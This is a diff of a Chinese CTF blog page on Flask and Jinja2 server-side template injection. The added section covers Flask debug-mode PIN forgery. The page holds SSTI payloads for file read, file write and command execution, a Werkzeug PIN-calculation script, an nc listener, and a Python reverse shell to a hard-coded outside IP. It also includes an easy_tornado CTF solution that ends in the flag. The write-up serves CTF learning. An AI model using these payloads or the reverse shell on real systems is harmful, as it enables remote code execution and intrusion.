@@ -394,14 +394,14 @@ if _">
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    1.2k
+                    1.4k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    5 分
+                    7 分
                 </div>
                 
 				
@@ -545,7 +545,61 @@ app<span class="token punctuation">.</span>secret_key <span class="token operato
 <pre><code>{{''.__class__.__mro__[2].__subclasses__()[40]('/tmp/owned.cfg','w').write('code')}}</code></pre><p>执行,先通过上一步的写，然后执行</p>
 <pre><code>{{ config.from_pyfile('/tmp/owned.cfg') }}</code></pre><h4 id="python3"><a href="#python3" class="headerlink" title="python3"></a>python3</h4><p>任意文件读取</p>
 <pre><code>http://127.0.0.1/{{().__class__.__bases__[0].__subclasses__()[177].__init__.__globals__.__builtins__['open']('d://whale.txt').read()}}</code></pre><p>一句指令任意执行</p>
-<pre><code>http://127.0.0.1/{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['eval']("__import__('os').popen('whoami').read()")}}</code></pre><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><h4 id="easy-tornado模板注入"><a href="#easy-tornado模板注入" class="headerlink" title="easy_tornado模板注入"></a>easy_tornado模板注入</h4><p>2个hint<br>一个是</p>
+<pre><code>http://127.0.0.1/{{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['eval']("__import__('os').popen('whoami').read()")}}</code></pre><h3 id="Flask开启debug模式Pin安全"><a href="#Flask开启debug模式Pin安全" class="headerlink" title="Flask开启debug模式Pin安全"></a>Flask开启debug模式Pin安全</h3><p><a href="https://xz.aliyun.com/t/2553#toc-2" target="_blank" rel="noopener">参考https://xz.aliyun.com/t/2553#toc-2</a><br>代码</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask
+app<span class="token operator">=</span>Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
+
+@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span>
+<span class="token keyword">def</span> <span class="token function">hello_world</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">return</span> hello
+
+<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">'__main__'</span><span class="token punctuation">:</span>
+    app<span class="token punctuation">.</span>debug <span class="token operator">=</span> <span class="token boolean">True</span>
+    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span>port<span class="token operator">=</span><span class="token number">8087</span><span class="token punctuation">)</span></code></pre>
+<p>运行会有一个pin值，每次不变，我这里是<code>186-827-653</code>,界面输入pin值获得权限<br>payload<br>先计算pin值</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> hashlib
+<span class="token keyword">from</span> itertools <span class="token keyword">import</span> chain
+probably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
+    <span class="token string">'root'</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true"># username</span>
+    <span class="token string">'flask.app'</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true"># modname</span>
+    <span class="token string">'Flask'</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true"># getattr(app, '__name__', getattr(app.__class__, '__name__'))</span>
+    <span class="token string">'/usr/local/lib/python3.5/dist-packages/flask/app.py'</span> <span class="token comment" spellcheck="true"># getattr(mod, '__file__', None),</span>
+<span class="token punctuation">]</span>
+
+private_bits <span class="token operator">=</span> <span class="token punctuation">[</span>
+    <span class="token string">'95531326077'</span><span class="token punctuation">,</span><span class="token comment" spellcheck="true"># str(uuid.getnode()),  /sys/class/net/eth0/address->hex->dec 00:16:3e:1c:5a:7d0 >95531326077</span>
+    <span class="token string">'4de81b88ea87bb469a366a045ab870c1'</span><span class="token comment" spellcheck="true"># get_machine_id(), /etc/machine-id</span>
+<span class="token punctuation">]</span>
+
+h <span class="token operator">=</span> hashlib<span class="token punctuation">.</span>md5<span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token keyword">for</span> bit <span class="token keyword">in</span> chain<span class="token punctuation">(</span>probably_public_bits<span class="token punctuation">,</span> private_bits<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> <span class="token operator">not</span> bit<span class="token punctuation">:</span>
+        <span class="token keyword">continue</span>
+    <span class="token keyword">if</span> isinstance<span class="token punctuation">(</span>bit<span class="token punctuation">,</span> str<span class="token punctuation">)</span><span class="token punctuation">:</span>
+        bit <span class="token operator">=</span> bit<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
+    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>bit<span class="token punctuation">)</span>
+h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>b<span class="token string">'cookiesalt'</span><span class="token punctuation">)</span>
+
+cookie_name <span class="token operator">=</span> <span class="token string">'__wzd'</span> <span class="token operator">+</span> h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">20</span><span class="token punctuation">]</span>
+
+num <span class="token operator">=</span> None
+<span class="token keyword">if</span> num <span class="token keyword">is</span> None<span class="token punctuation">:</span>
+    h<span class="token punctuation">.</span>update<span class="token punctuation">(</span>b<span class="token string">'pinsalt'</span><span class="token punctuation">)</span>
+    num <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'%09d'</span> <span class="token operator">%</span> int<span class="token punctuation">(</span>h<span class="token punctuation">.</span>hexdigest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">9</span><span class="token punctuation">]</span>
+
+rv <span class="token operator">=</span>None
+<span class="token keyword">if</span> rv <span class="token keyword">is</span> None<span class="token punctuation">:</span>
+    <span class="token keyword">for</span> group_size <span class="token keyword">in</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">:</span>
+        <span class="token keyword">if</span> len<span class="token punctuation">(</span>num<span class="token punctuation">)</span> <span class="token operator">%</span> group_size <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
+            rv <span class="token operator">=</span> <span class="token string">'-'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>num<span class="token punctuation">[</span>x<span class="token punctuation">:</span>x <span class="token operator">+</span> group_size<span class="token punctuation">]</span><span class="token punctuation">.</span>rjust<span class="token punctuation">(</span>group_size<span class="token punctuation">,</span> <span class="token string">'0'</span><span class="token punctuation">)</span>
+                          <span class="token keyword">for</span> x <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> len<span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">,</span> group_size<span class="token punctuation">)</span><span class="token punctuation">)</span>
+            <span class="token keyword">break</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        rv <span class="token operator">=</span> num
+
+<span class="token keyword">print</span><span class="token punctuation">(</span>rv<span class="token punctuation">)</span></code></pre>
+<p>成功拿到<br>服务器<br><code>nc -vvlp 1234</code><br>flask</p>
+<pre><code>import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;106.15.177.94&quot;,1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);</code></pre><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><h4 id="easy-tornado模板注入"><a href="#easy-tornado模板注入" class="headerlink" title="easy_tornado模板注入"></a>easy_tornado模板注入</h4><p>2个hint<br>一个是</p>
 <pre><code>/hints.txt
 md5(cookie_secret+md5(filename))</code></pre><p>一个是</p>
 <pre><code>flag in /fllllllllllllag</code></pre><p>我们要获得cookie_secret<br>发现模板注入<br><code>http://ccd83b2b-0554-474d-a173-098a24982105.node2.buuoj.cn.wetolink.com:82/error?msg=Error</code><br><code>http://ccd83b2b-0554-474d-a173-098a24982105.node2.buuoj.cn.wetolink.com:82/error?msg=2</code><br>我们之后进行各种尝试与资料获取发现对于tornado框架存在附属文件handler.settings<br><code>http://ccd83b2b-0554-474d-a173-098a24982105.node2.buuoj.cn.wetolink.com:82/error?msg=</code><br>获得<br><code>{&#39;autoreload&#39;: True, &#39;compiled_template_cache&#39;: False, &#39;cookie_secret&#39;: &#39;c60b48df-5a65-4b5e-bf46-94c3536c65e6&#39;}</code><br>所以得到<br><code>http://ccd83b2b-0554-474d-a173-098a24982105.node2.buuoj.cn.wetolink.com:82/file?filename=/fllllllllllllag&amp;filehash=55e8b48b796a17f8ce4efa065aeec935</code><br><code>flag{d9b60421-fffb-4eb1-9eb1-62e2c15be06c}</code></p>
@@ -659,19 +713,20 @@ md5(cookie_secret+md5(filename))</code></pre><p>一个是</p>
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2019/11/19/64-wei-elf-de-ret2libc/">
+                <a href="/2019/11/19/flask-zhong-session-de-na-xie-shi/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="64位elf的ret2libc">
+                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="flask中session的那些事">
                         
-                        <span class="card-title">64位elf的ret2libc</span>
+                        <span class="card-title">flask中session的那些事</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            不同点主要是32位的参数丢栈上，而64位的函数前6个参数丢寄存器上x86-64环境下非微软操作系统的前六个整型参数通过寄存器传递,按顺序为:rdi,rsi,rdx,rcx,r8,r9.同时XMM0到XMM7用来放置浮点变元,通过栈传递参数时
+                            楔子在写HCTF2018-admin题目的时候，遇到了flask中session伪造的问题，打算研究一下
+一、cookie和session的一些小姿势1、cookie：在网站中，http请求是无状态的。也就是说即使第一次和服务器连接后并且登
                         
                     </div>
                     <div class="publish-info">
@@ -682,8 +737,12 @@ md5(cookie_secret+md5(filename))</code></pre><p>一个是</p>
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/Pwn/" class="post-category">
-                                    Pwn
+                            <a href="/categories/CTF/" class="post-category">
+                                    CTF
+                                </a>
+                            
+                            <a href="/categories/CTF/Web/" class="post-category">
+                                    Web
                                 </a>
                             
                             
@@ -708,20 +767,19 @@ md5(cookie_secret+md5(filename))</code></pre><p>一个是</p>
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2019/11/19/flask-zhong-session-de-na-xie-shi/">
+                <a href="/2019/11/19/ha-xi-chang-du-kuo-zhan-gong-ji-yi-ji-hashpump-an-zhuang-shi-yong-he-liang-dao-ti-mu/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/15.jpg" class="responsive-img" alt="flask中session的那些事">
+                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="哈希长度扩展攻击以及HashPump安装使用和两道题目">
                         
-                        <span class="card-title">flask中session的那些事</span>
+                        <span class="card-title">哈希长度扩展攻击以及HashPump安装使用和两道题目</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            楔子在写HCTF2018-admin题目的时候，遇到了flask中session伪造的问题，打算研究一下
-一、cookie和session的一些小姿势1、cookie：在网站中，http请求是无状态的。也就是说即使第一次和服务器连接后并且登
+                            能做什么如果salt的值你不知道，但是你知道长度，又知道sha1(salt)，那么就也就可以知道sha1(salt+“填充数据”+“任意可控数据”).这里的salt+“填充数据”就是对salt进行sha1时所补全的数据+最后8位的长度描述符
                         
                     </div>
                     <div class="publish-info">
@@ -736,8 +794,8 @@ md5(cookie_secret+md5(filename))</code></pre><p>一个是</p>
                                     CTF
                                 </a>
                             
-                            <a href="/categories/CTF/Web/" class="post-category">
-                                    Web
+                            <a href="/categories/CTF/Crypto/" class="post-category">
+                                    Crypto
                                 </a>
                             
                             
@@ -898,7 +956,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">160.1k</span>&nbsp;字
+                class="white-color">160.4k</span>&nbsp;字
             
             
             
